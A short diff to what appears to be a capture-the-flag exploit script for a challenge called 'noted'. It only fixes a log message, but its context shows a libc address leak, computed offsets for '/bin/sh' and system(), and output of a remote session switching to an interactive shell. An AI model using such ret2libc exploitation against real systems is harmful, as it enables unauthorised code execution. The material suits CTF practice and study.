@@ -277,7 +277,7 @@ def edit_note(title):
   leak = r.recv(0x4cc)
   libc_addr = u32(r.recv(4)) - 0x00018637 # local 0x19af3
   leak = r.recv()
-  log.info("libc addr" + hex(libc_addr))
+  log.info("libc addr: " + hex(libc_addr))
   bin_sh = libc_addr + 0x15909f     # local 0x16084c remote 0x15909f
   system_addr = libc_addr + 0x0003a920  # local 0x40310 remote 0x3a920
   log.info("/bin/sh at: " + hex(bin_sh))
@@ -318,7 +318,7 @@ if __name__ == "__main__":
 ➜  noted python ./noted.py chal.cykor.kr 20003
 [*] For remote: ./noted.py HOST PORT
 [+] Opening connection to chal.cykor.kr on port 20003: Done
-[*] libc addr0xf75c4000
+[*] libc addr: 0xf75c4000
 [*] /bin/sh at: 0xf771d09f
 [*] system at: 0xf75fe920
 [*] Switching to interactive mode
